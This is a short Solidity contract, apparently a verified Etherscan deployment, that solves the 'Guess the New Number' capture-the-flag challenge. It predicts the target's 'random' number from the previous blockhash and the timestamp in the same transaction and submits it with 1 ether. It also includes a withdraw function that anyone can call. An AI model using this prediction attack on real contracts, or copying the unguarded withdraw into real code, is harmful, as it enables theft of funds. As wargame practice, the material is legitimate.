/**
 *Submitted for verification at Etherscan.io on 2022-08-11
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;

interface IGuessTheNewNumberChallenge {
  function guess(uint8) external payable;
}
contract GuessTheNewNumberChallenge {
  IGuessTheNewNumberChallenge public _interface;

  constructor(address _interfaceAddress) {
    require(_interfaceAddress != address(0), "Address can not be Zero");
    _interface = IGuessTheNewNumberChallenge(_interfaceAddress);
  }
  function solve() public payable {
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
    _interface.guess{value: 1 ether}(answer);
  }
  function getBalance() public view returns(uint){
    return address(this).balance;
  }
  function withdraw() public {
    payable(msg.sender).transfer(address(this).balance);
  }
  function deposit() public payable {}
}